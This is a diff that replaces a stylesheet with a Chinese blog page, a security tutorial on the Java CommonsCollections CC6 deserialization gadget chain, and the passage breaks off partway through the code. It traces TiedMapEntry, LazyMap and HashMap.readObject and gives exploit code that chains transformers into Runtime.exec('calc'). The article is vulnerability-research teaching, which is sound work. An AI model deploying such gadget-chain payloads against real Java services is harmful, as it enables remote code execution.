@@ -1,62 +1,359 @@
-.l_body {
-  display: flex;
-  margin: auto;
-  padding: 0 var(--gap-l);
-  justify-content: center;
-  font-size: var(--fsp);
-}
-.l_body .l_left {
-  z-index: 8;
-  width: var(--width-left);
-  flex-shrink: 0;
-  position: sticky;
-  position: -webkit-sticky;
-  top: 8px;
-}
-.l_body .l_main {
-  flex-shrink: 1;
-  flex-grow: 1;
-  width: 320px;
-  max-width: var(--width-main);
-}
-.main-mask {
-  position: fixed;
-  pointer-events: none;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.2);
-  z-index: 9;
-  opacity: 0;
-  trans1: opacity;
-}
-@media screen and (max-width: $device-mobile-max) {
-  .mobile-only {
-    display: block !important;
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
+  
+  <meta name="generator" content="Hexo 7.1.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>漏洞篇 - Java 反序列化之 CC6 链 - 妙尽璇机</title>
+
+  
+    <meta name="description" content="前面在分析 CC1链 的 ysoserial 版时，我们知道 LazyMap 的 get 方法会调用成员属性 factory 的 transform 方法，而我们上一次是通过 AnnotationInvocationHandler 的 invoke 方法来调用这个 get 方法的。那么还有哪里能调用 LazyMap 的 get 方法呢？我们的 CC6 链给出了另一条路径：TiedMapEntry">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞篇 - Java 反序列化之 CC6 链">
+<meta property="og:url" content="https://changeyourway.github.io/2024/05/13/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC6%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="妙尽璇机">
+<meta property="og:description" content="前面在分析 CC1链 的 ysoserial 版时，我们知道 LazyMap 的 get 方法会调用成员属性 factory 的 transform 方法，而我们上一次是通过 AnnotationInvocationHandler 的 invoke 方法来调用这个 get 方法的。那么还有哪里能调用 LazyMap 的 get 方法呢？我们的 CC6 链给出了另一条路径：TiedMapEntry">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240514174305665.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240514174609890.png">
+<meta property="article:published_time" content="2024-05-13T09:15:09.329Z">
+<meta property="article:modified_time" content="2024-10-06T07:28:40.809Z">
+<meta property="article:author" content="妙尽璇机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20240514174305665.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
+
+  
+    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
+  
+
+  
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
+</head>
+<body>
+
+<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://raw.githubusercontent.com/ChangeYourWay/changeyourway.github.io/refs/heads/main/assets/20210722092640_f61bd.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">真理所致，吾心所向</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6-%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">CC6 链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%8B-TiedMapEntry-%E7%B1%BB"><span class="toc-text">利用链之 TiedMapEntry 类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-%E7%9A%84-getValue-%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">TiedMapEntry 的 getValue 方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-%E7%9A%84-hashCode-%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">TiedMapEntry 的 hashCode 方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB%E4%B9%8B-HashMap"><span class="toc-text">入口类之 HashMap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap-%E7%9A%84-readObject-%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">HashMap 的 readObject 方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap-%E7%9A%84-hash-%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">HashMap 的 hash 方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-payload1"><span class="toc-text">构造 payload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B-payload"><span class="toc-text">改进 payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E6%8A%9B%E5%87%BA"><span class="toc-text">问题抛出</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-payload2"><span class="toc-text">构造 payload2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-text">结语</span></a></li></ol></li></ol></div></div></widget>
+
+
+
+
+
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2025/07/12/Java%20%E5%AE%89%E5%85%A8/RASP%20%E7%A0%94%E7%A9%B6%EF%BC%8COpenRasp%20%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BB%95%E8%BF%87/"><span class="title">RASP 研究，OpenRasp 原理与绕过</span></a><a class="item title" href="/2025/06/02/CTF/2025%20D%5E3CTF%20Web%20WP/"><span class="title">2025 D^3CTF Web WP</span></a><a class="item title" href="/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><span class="title">漏洞篇 - JNDI 注入详解</span></a><a class="item title" href="/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - Hessian 反序列化详解</span></a><a class="item title" href="/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - SnakeYaml 反序列化</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    
+<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Java-%E5%AE%89%E5%85%A8/">Java 安全</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-05-13T09:15:09.329Z">2024-05-13</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-10-06T07:28:40.809Z">2024-10-06</time></span></div></div>
+</div>
+
+    
+    <div class="bottom">
+      <div class="text-area">
+        <h1 class="text title"><span>漏洞篇 - Java 反序列化之 CC6 链</span></h1>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>前面在分析 CC1链 的 ysoserial 版时，我们知道 LazyMap 的 get 方法会调用成员属性 factory 的 transform 方法，而我们上一次是通过 AnnotationInvocationHandler 的 invoke 方法来调用这个 get 方法的。那么还有哪里能调用 LazyMap 的 get 方法呢？我们的 CC6 链给出了另一条路径：TiedMapEntry 类的 getValue 方法会调用成员属性的 get 方法。</p>
+<span id="more"></span>
+
+<h2 id="CC6-链分析"><a href="#CC6-链分析" class="headerlink" title="CC6 链分析"></a>CC6 链分析</h2><p>JDK 8u71 版本之后 AnnotationInvocationHandler 的 readObject 方法被改写，CC1 链无法利用，于是引出了可以不需要经过 AnnotationInvocationHandler 类的 CC6 链。</p>
+<h3 id="利用链之-TiedMapEntry-类"><a href="#利用链之-TiedMapEntry-类" class="headerlink" title="利用链之 TiedMapEntry 类"></a>利用链之 TiedMapEntry 类</h3><h4 id="TiedMapEntry-的-getValue-方法："><a href="#TiedMapEntry-的-getValue-方法：" class="headerlink" title="TiedMapEntry 的 getValue 方法："></a>TiedMapEntry 的 getValue 方法：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>map 是 TiedMapEntry 类中定义的一个属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Map map;</span><br></pre></td></tr></table></figure>
+
+<p>这个成员属性在 TiedMapEntry 的构造方法中被赋值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这个构造方法被 public 修饰，可以直接调用。那么只需要将 this.map 设置成 LazyMap 对象就好了。将 this.map 设置成 LazyMap 对象以后，在 TiedMapEntry 的 getValue 方法中，会将 TiedMapEntry 的 成员属性 key 作为 LazyMap 对象的 get 方法的参数传入，这个 key 接下来会被作为 transform 的参数，那么就应该知道 key 应该传什么了，应该传 Runtime.class 。</p>
+<p>接下来要找谁调用了 TiedMapEntry 的 getValue 方法，TiedMapEntry 的 hashCode 方法调用了此方法。</p>
+<h4 id="TiedMapEntry-的-hashCode-方法："><a href="#TiedMapEntry-的-hashCode-方法：" class="headerlink" title="TiedMapEntry 的 hashCode 方法："></a>TiedMapEntry 的 hashCode 方法：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">    Object value = getValue();</span><br><span class="line">    return (getKey() == null ? 0 : getKey().hashCode()) ^</span><br><span class="line">           (value == null ? 0 : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要想调用 TiedMapEntry 的 hashCode 方法，可以把 TiedMapEntry 对象作为 HashMap 对象的 key 传入，这样在反序列化 HashMap 对象时，调用 HashMap 对象的 readObject 方法，就会调用 key 的 hashCode 方法。这是在学习 URLDNS 链时已经学到的内容，这里不妨再复习一下。</p>
+<h3 id="入口类之-HashMap"><a href="#入口类之-HashMap" class="headerlink" title="入口类之 HashMap"></a>入口类之 HashMap</h3><h4 id="HashMap-的-readObject-方法："><a href="#HashMap-的-readObject-方法：" class="headerlink" title="HashMap 的 readObject 方法："></a>HashMap 的 readObject 方法：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                // Read and ignore number of buckets</span><br><span class="line">    int mappings = s.readInt(); // Read number of mappings (size)</span><br><span class="line">    if (mappings &lt; 0)</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +</span><br><span class="line">                                         mappings);</span><br><span class="line">    else if (mappings &gt; 0) &#123; // (if zero, use defaults)</span><br><span class="line">        // Size the table using given load factor only if within</span><br><span class="line">        // range of 0.25...4.0</span><br><span class="line">        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);</span><br><span class="line">        float fc = (float)mappings / lf + 1.0f;</span><br><span class="line">        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((int)fc));</span><br><span class="line">        float ft = (float)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (int)ft : Integer.MAX_VALUE);</span><br><span class="line">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        // Read the keys and values, and put the mappings in the HashMap</span><br><span class="line">        for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, false, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结尾处的这一句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure>
+
+<p>会调用 HashMap 的 hash 方法。</p>
+<h4 id="HashMap-的-hash-方法："><a href="#HashMap-的-hash-方法：" class="headerlink" title="HashMap 的 hash 方法："></a>HashMap 的 hash 方法：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里就会调用 key 的 hashCode 方法。</p>
+<p>利用链已经明了，开始构造 payload 。</p>
+<h3 id="构造-payload1"><a href="#构造-payload1" class="headerlink" title="构造 payload1"></a>构造 payload1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class payload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TiedMapEntry</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, Runtime.class);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 HashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        